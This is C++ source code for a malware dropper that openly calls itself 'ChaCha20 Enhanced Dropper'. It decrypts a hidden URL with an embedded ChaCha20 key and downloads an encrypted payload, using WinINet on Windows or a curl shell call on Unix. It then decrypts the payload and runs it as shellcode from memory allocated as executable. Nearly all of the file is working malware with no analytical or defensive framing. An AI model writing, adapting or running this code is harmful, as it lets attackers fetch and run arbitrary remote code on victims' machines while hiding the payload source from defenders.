#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <ctime>
#include <iomanip>
#include <sstream>

#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#else
#include <sys/mman.h>
#include <unistd.h>
#include <sys/stat.h>
#endif

// ChaCha20 implementation
inline void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8) | (d >> 24);
    c += d; b ^= c; b = (b << 7) | (b >> 25);
}

void chachaBlock(uint32_t output[16], const uint32_t input[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) {
        x[i] = input[i];
    }
    
    for (int i = 0; i < 10; i++) {
        quarterRound(x[0], x[4], x[8], x[12]);
        quarterRound(x[1], x[5], x[9], x[13]);
        quarterRound(x[2], x[6], x[10], x[14]);
        quarterRound(x[3], x[7], x[11], x[15]);
        
        quarterRound(x[0], x[5], x[10], x[15]);
        quarterRound(x[1], x[6], x[11], x[12]);
        quarterRound(x[2], x[7], x[8], x[13]);
        quarterRound(x[3], x[4], x[9], x[14]);
    }
    
    for (int i = 0; i < 16; i++) {
        output[i] = x[i] + input[i];
    }
}

void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
    state[0] = 0x61707865;
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;
    
    for (int i = 0; i < 8; i++) {
        state[4 + i] = ((uint32_t)key[4*i]) |
                       ((uint32_t)key[4*i + 1] << 8) |
                       ((uint32_t)key[4*i + 2] << 16) |
                       ((uint32_t)key[4*i + 3] << 24);
    }
    
    state[12] = counter;
    
    for (int i = 0; i < 3; i++) {
        state[13 + i] = ((uint32_t)nonce[4*i]) |
                        ((uint32_t)nonce[4*i + 1] << 8) |
                        ((uint32_t)nonce[4*i + 2] << 16) |
                        ((uint32_t)nonce[4*i + 3] << 24);
    }
}

void chacha20Decrypt(const uint8_t* input, uint8_t* output, size_t length,
                     const uint8_t key[32], const uint8_t nonce[12]) {
    uint32_t state[16];
    uint32_t keystream[16];
    uint8_t* keystream_bytes = (uint8_t*)keystream;
    uint32_t counter = 0;
    
    size_t processed = 0;
    while (processed < length) {
        initChachaState(state, key, nonce, counter);
        chachaBlock(keystream, state);
        
        size_t blockSize = (length - processed < 64) ? length - processed : 64;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream_bytes[i];
        }
        
        processed += blockSize;
        counter++;
    }
}

// Embedded ChaCha20 encrypted configuration
const char* ENCRYPTED_URL = "71984711b6e93929e5dc401fd9ee7a68aa61b006cffe03bf92ad5d38bd9950b24646bf94c3074685";
const char* CHACHA_KEY = "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f";
const char* CHACHA_NONCE = "000000000000000000000000";

uint8_t hexCharToInt(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

void hexStringToBytes(const std::string& hex, uint8_t* bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        bytes[i] = (hexCharToInt(hex[2*i]) << 4) | hexCharToInt(hex[2*i + 1]);
    }
}

std::string decryptConfig(const char* encrypted, const char* keyHex, const char* nonceHex) {
    size_t encLen = strlen(encrypted) / 2;
    std::vector<uint8_t> encBytes(encLen);
    std::vector<uint8_t> decBytes(encLen);
    uint8_t key[32];
    uint8_t nonce[12];
    
    hexStringToBytes(encrypted, encBytes.data(), encLen);
    hexStringToBytes(keyHex, key, 32);
    hexStringToBytes(nonceHex, nonce, 12);
    
    chacha20Decrypt(encBytes.data(), decBytes.data(), encLen, key, nonce);
    
    return std::string(decBytes.begin(), decBytes.end());
}

#ifdef _WIN32
bool downloadFile(const std::string& url, std::vector<uint8_t>& data) {
    HINTERNET hInternet = InternetOpenA("ChaCha20Dropper", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return true;
}
#else
bool downloadFile(const std::string& url, std::vector<uint8_t>& data) {
    // Simple curl-based download for Unix/Linux
    std::string cmd = "curl -s \"" + url + "\" > /tmp/chacha_payload.tmp";
    system(cmd.c_str());
    
    std::ifstream file("/tmp/chacha_payload.tmp", std::ios::binary);
    if (!file) return false;
    
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    data.resize(size);
    file.read(reinterpret_cast<char*>(data.data()), size);
    file.close();
    
    system("rm -f /tmp/chacha_payload.tmp");
    return true;
}
#endif

void executePayload(const std::vector<uint8_t>& payload) {
#ifdef _WIN32
    void* exec = VirtualAlloc(0, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, payload.data(), payload.size());
        ((void(*)())exec)();
        VirtualFree(exec, 0, MEM_RELEASE);
    }
#else
    void* exec = mmap(NULL, payload.size(), PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec != MAP_FAILED) {
        memcpy(exec, payload.data(), payload.size());
        ((void(*)())exec)();
        munmap(exec, payload.size());
    }
#endif
}

int main() {
    std::cout << "[*] ChaCha20 Enhanced Dropper Starting..." << std::endl;
    
    // Decrypt configuration
    std::string url = decryptConfig(ENCRYPTED_URL, CHACHA_KEY, CHACHA_NONCE);
    std::cout << "[*] Configuration decrypted successfully" << std::endl;
    
    // Download payload
    std::vector<uint8_t> encryptedPayload;
    if (!downloadFile(url, encryptedPayload)) {
        std::cerr << "[!] Failed to download payload" << std::endl;
        return 1;
    }
    
    std::cout << "[*] Downloaded encrypted payload: " << encryptedPayload.size() << " bytes" << std::endl;
    
    // Extract nonce from beginning of payload (first 12 bytes)
    if (encryptedPayload.size() < 12) {
        std::cerr << "[!] Invalid payload size" << std::endl;
        return 1;
    }
    
    uint8_t payloadNonce[12];
    memcpy(payloadNonce, encryptedPayload.data(), 12);
    
    // Decrypt payload (skip the nonce)
    std::vector<uint8_t> decryptedPayload(encryptedPayload.size() - 12);
    uint8_t payloadKey[32];
    hexStringToBytes(CHACHA_KEY, payloadKey, 32);
    
    chacha20Decrypt(encryptedPayload.data() + 12, decryptedPayload.data(), 
                    decryptedPayload.size(), payloadKey, payloadNonce);
    
    std::cout << "[*] Payload decrypted successfully" << std::endl;
    
    // Execute payload
    executePayload(decryptedPayload);
    
    std::cout << "[*] Execution complete" << std::endl;
    return 0;
}